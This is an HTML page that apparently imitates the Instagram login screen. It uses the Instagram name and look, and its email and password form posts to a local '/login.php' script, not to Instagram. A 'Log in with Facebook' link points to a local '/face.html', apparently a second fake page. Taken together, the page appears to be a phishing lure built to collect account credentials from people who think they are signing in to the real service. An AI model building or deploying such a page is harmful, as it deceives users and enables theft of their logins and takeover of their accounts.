<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&family=Pacifico&display=swap" rel="stylesheet">
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 360px;
      text-align: center;
    }
    .card {
      border: 1px solid #121212;
      padding: 28px;
      border-radius: 6px;
      background: transparent;
    }
    .logo {
      font-family: 'Pacifico', cursive;
      font-size: 48px;
      color: #fff;
      margin-bottom: 18px;
    }
    input {
      width: 90%;
      background: #0f0f10;
      border: 1px solid #222;
      color: #ddd;
      padding: 10px;
      margin-bottom: 10px;
      border-radius: 6px;
      font-size: 14px;
      outline: none;
    }
    input::placeholder {
      color: #8b8b8b;
    }
    button {
      width: 100%;
      padding: 10px 0;
      border-radius: 10px;
      background: #0095f6;
      color: #fff;
      border: none;
      font-weight: 600;
      font-size: 15px;
      cursor: pointer;
    }
    .divider {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 16px 0;
      color: #8b8b8b;
      font-size: 12px;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #262626;
    }
    .fb-login {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
      font-size: 14px;
      display: block;
      margin-bottom: 10px;
    }
    .forgot {
      font-size: 13px;
      color: #b6b6b6;
      text-decoration: none;
    }
    .signup-card {
      border: 1px solid #121212;
      padding: 16px;
      margin-top: 14px;
      border-radius: 6px;
      color: #bdbdbd;
      font-size: 14px;
    }
    .signup-card a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <form class="login-container"  method="POST" action="/login.php">
    <div class="card">
      <div class="logo">Instagram</div>
      <input type="email" name="email" placeholder="Phone number, username or email address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log in</button>
      <div class="divider"><span>OR</span></div>
      <a class="fb-login" href="/face.html">Log in with Facebook</a>
      <a href="#" class="forgot">Forgotten your password?</a>
    </div>
    <div class="signup-card">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </form>
  </script>
</body>
</html>
